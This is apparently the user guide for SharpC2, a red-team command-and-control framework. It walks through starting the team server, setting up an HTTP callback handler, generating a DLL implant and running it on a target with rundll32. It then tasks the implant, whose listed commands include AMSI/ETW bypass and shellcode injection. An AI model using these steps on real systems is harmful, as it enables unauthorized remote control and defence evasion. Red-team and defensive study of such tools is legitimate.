# Basic Usage

## Start the Team Server

Launch the team server and provide a shared password that will be used by users to connect.  Make sure you run as root if you want to bind to low ports (e.g. 80) for the default handler.


```text
rasta@Rastas-MBP publish % sudo ./TeamServer --password Passw0rd!
Password:
info: Microsoft.Hosting.Lifetime[0]
    Now listening on: https://0.0.0.0:8443
info: Microsoft.Hosting.Lifetime[0]
    Application started. Press Ctrl+C to shut down.
info: Microsoft.Hosting.Lifetime[0]
    Hosting environment: Production
info: Microsoft.Hosting.Lifetime[0]
    Content root path: /Users/rasta/RiderProjects/SharpC2/TeamServer/bin/Release/net5.0/osx-x64/publish
```

The team server will listen for user connections on port 8443.

## Start the Client

Launch the client and enter the connection details of the team server.  You'll be prompted to accept the server's self-signed certificate.

```text
(server)> localhost
(port)> 8443
(nick)> rasta
(pass)> 

Server Certificate
------------------

[Subject]
CN=localhost

[Issuer]
CN=localhost

[Serial Number]
5AEB47285CFAB626

[Not Before]
22/05/2021 19:48:19

[Not After]
22/05/2022 19:48:19

[Thumbprint]
2A02193D78359FEA0AF73916923C193D97B32809

(accept? [y/N])>
```

## Configure and Start a Handler

In SharpC2, "Handlers" are akin to Listeners in other frameworks.  SharpC2 handlers can do more than just listen for incoming data, which is why we elected to use different terminology.

The `[drones]` screen is the default for the client.  You can type `help` on any screen to see commands contextual to that screen.

```text
[drones] # help

Name      Description
----      -----------
back      Back to previous screen
exit      Exit this client
handlers  Go to Handlers
help      Get help
interact  Interact with the given Drone
list      List Drones
payloads  Go to Payloads
```

SharpC2 comes with one handler by default which sends and receives C2 traffic over HTTP.

```text
[drones] # handlers
[handlers] # list

Name          Running
----          -------
default-http  False
```

Enter the configuration screen for a handler with `config` and then `show` to display the configuration options and their current values.

```text
[handlers] # config default-http
[default-http] # show

Name            Value      Optional
----            -----      --------
BindPort        80         False
ConnectAddress  localhost  False
ConnectPort     80         False
```

Change values with `set`.

```text
[default-http] # set BindPort 8080
[default-http] # set ConnectPort 8080
[default-http] # set ConnectAddress 192.168.1.105
[default-http] # show

Name            Value          Optional
----            -----          --------
BindPort        8080           False
ConnectAddress  192.168.1.105  False
ConnectPort     8080           False
```

A handler can be started and stopped from inside this configuration screen, or in the `[handlers]` screen.

```text
[default-http] # start
[+] Handler "default-http" started.

[default-http] # stop
[+] Handler "default-http" stopped.
```

or

```text
[handlers] # list

Name          Running
----          -------
default-http  False

[handlers] # start default-http
[+] Handler "default-http" started.

[handlers] # list

Name          Running
----          -------
default-http  True
```

## Generate a Payload

Payloads can be generated from the `[payloads]` screen.

```text
[drones] # payloads
[payloads] # show

Handler  Format  DllExport
-------  ------  ---------
         Exe     Execute
```

As in previous screens, use the `set` commands to set the desired options.

```text
[payloads] # set handler default-http
[payloads] # set format Dll          
[payloads] # set dllexport DemoPayload
[payloads] # show

Handler       Format  DllExport
-------       ------  ---------
default-http  Dll     DemoPayload
```

Some options are not applicable for all payload types (e.g. DllExport does nothing for the Exe format).  To generate the payload, use `generate </output/path>`.

```text
[payloads] # generate /tmp/drone.dll
[+] Saved 89088 bytes.
```

Copy to the target and execute.

```text
C:\Users\Rasta\Desktop>rundll32 drone.dll,DemoPayload
```

## Interacting with Drones

```text
[drones] # [+] Drone 45322180d4 checked in.
[drones] # list

Guid        Address      Hostname         Username  Process   PID   Arch  LastSeen
----        -------      --------         --------  -------   ---   ----  --------
45322180d4  10.211.55.4  DESKTOP-KT84EGC  Rasta     rundll32  3688  x64   0.2s
```

To interact with a Drone, use `interact <guid>`.

```text
[drones] # interact 45322180d4
[45322180d4] # help

Name              Description
----              -----------
back              Back to previous screen
bypass            Set a directive to bypass AMSI/ETW on tasks
cd                Change working directory
execute-assembly  Execute a .NET assembly
exit              Exit this Drone
getuid            Get current identity
help              Get help
load-module       Load an external Drone module
ls                List filesystem
overload          Map and execute a native DLL
pwd               Print working directory
run               Run a command
shell             Run a command via cmd.exe
shinject          Inject arbitrary shellcode into a process
sleep             Set sleep interval and jitter
```

`help [command]` will provide a short description and usage.

```text
[45322180d4] # help shell
Run a command via cmd.exe
Usage: shell [cmd]

[45322180d4] # help run
Run a command
Usage: run [cmd] <args>
```

Arguments in square brackets are `[mandatory]`, those in angled brackets are `<optional>`.

```text
[b6631644c4] # run whoami /groups
[+] Drone tasked: d12abf46ad

[b6631644c4] # [+] Drone checked in. Sent 107 bytes.
[+] Output received:

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                                        
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only                          
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only                          
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192                                                    



[+] Task complete.
```